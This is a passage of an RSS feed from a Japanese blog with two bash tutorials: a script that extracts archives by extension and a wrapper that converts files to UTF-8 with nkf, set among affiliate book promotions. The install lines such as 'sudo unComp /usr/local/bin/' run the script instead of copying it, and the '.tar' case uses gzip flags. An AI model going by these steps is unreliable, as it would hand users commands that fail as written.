&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【unComp】Bashで便利なコマンドを作ってみようって話</title><link>https://suzukiiichiro.github.io/posts/2021-12-25-01-suzuki/</link><pubDate>Thu, 23 Dec 2021 13:11:13 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2021-12-25-01-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-25-01-suzuki/2021-12-23-bash.jpg" alt="Featured image of post 【unComp】Bashで便利なコマンドを作ってみようって話" />&lt;h2 id="できること">できること&lt;/h2>
&lt;p>圧縮されているファイルを、ファイルの拡張子にあわせて解凍すると言う作業は、日常的に多いものです。今回は、圧縮ファイルの拡張子を判断して自動的に解凍するシェルスクリプトを作成してみます。&lt;/p>
&lt;h2 id="圧縮ファイルと実行コマンドパラメータ一覧">圧縮ファイルと実行コマンド、パラメータ一覧&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">
拡張子 パラメータ
tgz &lt;span class="p">|&lt;/span> tar.gz tar zxvf
tar.Z gunzip
tar.bz2 tar xvfj
tar tar xvfz
gz gunzip
Z gunzip
bz2 bunzip2
zip unzip
&lt;/code>&lt;/pre>&lt;/div>&lt;p>こうしたコマンドやパラメータを覚えておくことは大切ですが、頭の経年劣化とともに、つい思い出すことができず、Googleで検索して調べると言ったことは、往々にしてあることです。&lt;/p>
&lt;h2 id="実行例">実行例&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="c1"># 圧縮ファイルを解凍する便利な unCompコマンド&lt;/span>
$ unComp comp.tar.gz2
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="作成">作成&lt;/h2>
&lt;p>まずファイルを作ります。ファイル名は unComp とします&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="c1"># unComp というファイルを作成&lt;/span>
$ :&amp;gt; unComp
&lt;span class="c1"># vim で unComp を開く&lt;/span>
$ vim unComp
&lt;/code>&lt;/pre>&lt;/div>&lt;p>unCompファイルに以下の内容を貼り付ける&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>&lt;span class="c1">#&lt;/span>
&lt;span class="c1">#圧縮されているファイルを解凍する&lt;/span>
&lt;span class="c1"># unComp を /usr/local/bin/にコピーすると&lt;/span>
&lt;span class="c1"># 通常のコマンドとして本実行ファイルを利用する事が出来ます。&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="c1"># cp unComp /usr/local/bin/unComp&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="c1"># 実行例&lt;/span>
&lt;span class="c1"># $ unComp filename(圧縮ファイル)&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nv">$#&lt;/span> -ne &lt;span class="m">1&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;span class="nb">exit&lt;/span> &lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nv">$1&lt;/span> in
*.tgz &lt;span class="p">|&lt;/span> *.tar.gz&lt;span class="o">)&lt;/span> tar zxvf &lt;span class="nv">$1&lt;/span> &lt;span class="p">;;&lt;/span>
*.tar.Z&lt;span class="o">)&lt;/span> gunzip &lt;span class="nv">$1&lt;/span>
tar xvf &lt;span class="k">$(&lt;/span> &lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$1&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> sed &lt;span class="s1">&amp;#39;s/\.Z$//&amp;#39;&lt;/span>&lt;span class="k">)&lt;/span>
&lt;span class="p">;;&lt;/span>
*.tar.bz2&lt;span class="o">)&lt;/span> tar xvfj &lt;span class="nv">$1&lt;/span>&lt;span class="p">;;&lt;/span>
*.tar&lt;span class="o">)&lt;/span> tar xvfz &lt;span class="nv">$1&lt;/span>&lt;span class="p">;;&lt;/span>
*.gz&lt;span class="o">)&lt;/span> gunzip &lt;span class="nv">$1&lt;/span>&lt;span class="p">;;&lt;/span>
*.Z&lt;span class="o">)&lt;/span> gunzip &lt;span class="nv">$1&lt;/span>&lt;span class="p">;;&lt;/span>
*.bz2&lt;span class="o">)&lt;/span> bunzip2 &lt;span class="nv">$1&lt;/span>&lt;span class="p">;;&lt;/span>
*.zip&lt;span class="o">)&lt;/span> unzip &lt;span class="nv">$1&lt;/span>&lt;span class="p">;;&lt;/span>
*&lt;span class="o">)&lt;/span> &lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ファイルの拡張子が対応していません:&lt;/span>&lt;span class="nv">$1&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;span class="k">esac&lt;/span>
&lt;span class="nb">exit&lt;/span> &lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>作成したファイルには日本語が含まれているため、unCompファイルを UTF-8に変換しておきます。&lt;br>
&lt;a class="link" href="https://suzukiiichiro.github.io/posts/2021-12-23-suzuki/" title="wLu"
target="_blank" rel="noopener"
>wLu&lt;/a>をつかってUTF-8に変換するとさらに便利です。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="c1"># unComp ファイルをnkf -wLu でUTF-8に変換&lt;/span>
$ nkf -wLu unComp &amp;gt; unComp.txt
&lt;span class="c1"># unComp.txtをunCompにリネームします&lt;/span>
$ mv unComp.txt unComp
&lt;span class="c1"># 作成したunCompコマンドファイルを/usr/local/bin にコピーします&lt;/span>
$ sudo unComp /usr/local/bin/
&lt;span class="c1"># コマンドが配置されたかを確認&lt;/span>
$ which unComp
$ /usr/local/bin/unComp
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="使い方">使い方&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="c1"># 圧縮ファイルの拡張子を気にせずをコマンド一発で解凍する&lt;/span>
&lt;span class="c1"># 実行&lt;/span>
$ unComp sample.zip
&lt;/code>&lt;/pre>&lt;/div>&lt;p>圧縮ファイルの拡張子に併せたコマンドを思い出したり、さらにはコマンドのパラメータをGoogleで調べたりする必要が減ります。必要に応じて、ソースにコマンドやパラメータを追加すれば、さらに拡張できます。&lt;br>
便利ですね。&lt;/p>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【wLu】Bashで便利なコマンドを作ってみようって話</title><link>https://suzukiiichiro.github.io/posts/2021-12-23-suzuki/</link><pubDate>Thu, 23 Dec 2021 10:27:27 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2021-12-23-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-23-suzuki/2021-12-23-bash.jpg" alt="Featured image of post 【wLu】Bashで便利なコマンドを作ってみようって話" />&lt;h2 id="必要なもの">必要なもの&lt;/h2>
&lt;p>ネットワーク漢字フィルター nkf&lt;br>
※macの場合、&lt;a class="link" href="https://brew.sh/index_ja" title="Homebrew"
target="_blank" rel="noopener"
>Homebrew&lt;/a> が必要になります。&lt;/p>
&lt;h2 id="nkf-インストールの手順">nkf インストールの手順&lt;/h2>
&lt;p>まず、nkfがインストールされているかを確認します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">$ which nkf
/usr/local/bin/nkf
&lt;/code>&lt;/pre>&lt;/div>&lt;p>インストールされていない場合、macの場合はbrewでインストールします。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">$ brew install nkf
&lt;/code>&lt;/pre>&lt;/div>&lt;p>インストールしようとすると以下のエラーが出ることがあります&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">Error: The &lt;span class="sb">`&lt;/span>brew link&lt;span class="sb">`&lt;/span> step did not &lt;span class="nb">complete&lt;/span> successfully
The formula built, but is not symlinked into /usr/local
Could not symlink share/man/ja/man1/nkf.1
/usr/local/share/man/ja/man1 is not writable.
&lt;/code>&lt;/pre>&lt;/div>&lt;p>権限周りを下記のコマンドを打って変更します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">sudo chmod &lt;span class="m">775&lt;/span> /usr/local/share/man/ja/man1
sudo chown &amp;lt;ユーザ名&amp;gt;:admin /usr/local/share/man/ja/man1
&lt;/code>&lt;/pre>&lt;/div>&lt;p>コマンドを確認します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">$ nkf -v
Network Kanji Filter Version 2.1.5 &lt;span class="o">(&lt;/span>2018-12-15&lt;span class="o">)&lt;/span>
Copyright &lt;span class="o">(&lt;/span>C&lt;span class="o">)&lt;/span> 1987, FUJITSU LTD. &lt;span class="o">(&lt;/span>I.Ichikawa&lt;span class="o">)&lt;/span>.
Copyright &lt;span class="o">(&lt;/span>C&lt;span class="o">)&lt;/span> 1996-2018, The nkf Project.
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="使い方">使い方&lt;/h2>
&lt;p>nkfコマンドとは？&lt;br>
「nkf」は「Network Kanji Filter」の略で、LinuxとWindowsなど、異なるOS間でテキストデータを交換する際に問題となる文字コードと改行コードを変換するためのコマンドです。&lt;/p>
&lt;p>nkfコマンドの書式&lt;br>
nkf オプション ファイル名&lt;/p>
&lt;p>UTF-8に変換する場合は、オプションに wLu をつけて変換します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">$ nkf -wLu isofile.txt &amp;gt; utf8.txt
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="変換の流れ手動編">変換の流れ（手動編）&lt;/h3>
&lt;p>元ファイル moto.txt (UTF-8以外のファイルエンコード、改行コード）&lt;br>
↓&lt;br>
変換後のファイル ato.txt(UTF-8に変換したファイル）&lt;br>
↓&lt;br>
変換後のファイルをリネームする&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="c1"># UTF-8に変換&lt;/span>
$ nkf -wLu moto.txt &amp;gt; ato.txt
&lt;span class="c1"># 変換後のファイルを元のファイル名にリネームする&lt;/span>
$ mv ato.txt moto.txt
&lt;span class="c1"># vimiでファイルエンコードを確認する&lt;/span>
$ vim moto.txt
&lt;/code>&lt;/pre>&lt;/div>&lt;p>面倒ですね。ここで、一発でUTF-8に変換するコマンドを作成してみます。&lt;/p>
&lt;h3 id="変換の流れ自動編">変換の流れ（自動編）&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="c1"># UTF-8に変換 wLu コマンドをこれから自作します&lt;/span>
$ wLu moto.txt
$ vim moto.txt ← UTF-8 に変換されている！
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="コマンドの内容">コマンドの内容&lt;/h3>
&lt;p>まずファイルを作ります。ファイル名は wLu とします&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="c1"># wLu というファイルを作成&lt;/span>
$ :&amp;gt; wLu
&lt;span class="c1"># vim で wLu を開く&lt;/span>
$ vim wLu
&lt;/code>&lt;/pre>&lt;/div>&lt;p>以下の内容をファイルに貼り付ける&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="c1">#################################################&lt;/span>
&lt;span class="c1"># パラメータで渡されたファイル名をutf8に変換する&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="c1"># 使い方&lt;/span>
&lt;span class="c1"># wLu UTF-8に変換したいファイル名&lt;/span>
&lt;span class="c1"># wLu を /usr/local/bin/にコピーすると&lt;/span>
&lt;span class="c1"># 通常のコマンドとして本実行ファイルを利用する事が出来ます。&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="c1">#################################################&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="nv">filename&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$1&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="p">;&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="k">function&lt;/span> wLu&lt;span class="o">(){&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -f &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$filename&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
cat &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$filename&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> nkf -wLu &amp;gt; &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$filename&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>.u &lt;span class="p">;&lt;/span>
mv &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$filename&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>.u &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$filename&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="k">if&lt;/span> ! which nkf &amp;gt;/dev/null 2&amp;gt;&lt;span class="p">&amp;amp;&lt;/span>1&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;nkf がありません&amp;#34;&lt;/span> &lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;nkf をインストールして下さい&amp;#34;&lt;/span> &lt;span class="p">;&lt;/span>
&lt;span class="nb">exit&lt;/span> &lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -z &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$filename&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span> &lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;第一引数にファイル名を指定して下さい&amp;#34;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;実行例： wLu filename&amp;#34;&lt;/span> &lt;span class="p">;&lt;/span>
&lt;span class="nb">exit&lt;/span> &lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;span class="c1"># 実行&lt;/span>
wLu &lt;span class="p">;&lt;/span>
&lt;span class="c1"># 終了&lt;/span>
&lt;span class="nb">exit&lt;/span> &lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>作成したファイルには日本語が含まれているため、wLuファイルを UTF-8に変換しておきます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="c1"># wLu ファイルをnkf -wLu でUTF-8に変換&lt;/span>
$ nkf -wLu wLu &amp;gt; wLu.txt
&lt;span class="c1"># wLu.txtをwLuにリネームします&lt;/span>
$ mv wLu.txt wLu
&lt;span class="c1"># 作成したwLuコマンドファイルを/usr/local/bin にコピーします&lt;/span>
$ sudo wLu /usr/local/bin/
&lt;span class="c1"># コマンドが配置されたかを確認&lt;/span>
$ which wLu
$ /usr/local/bin/wLu
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="使い方-1">使い方&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="c1"># UTF-8以外のファイルエンコードファイル&lt;/span>
$ cat moto.txt
$ wLu moto.txt
&lt;/code>&lt;/pre>&lt;/div>&lt;p>変換結果を一時ファイルにし、リネームする手間が省けます。&lt;br>
便利ですね。&lt;/p>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
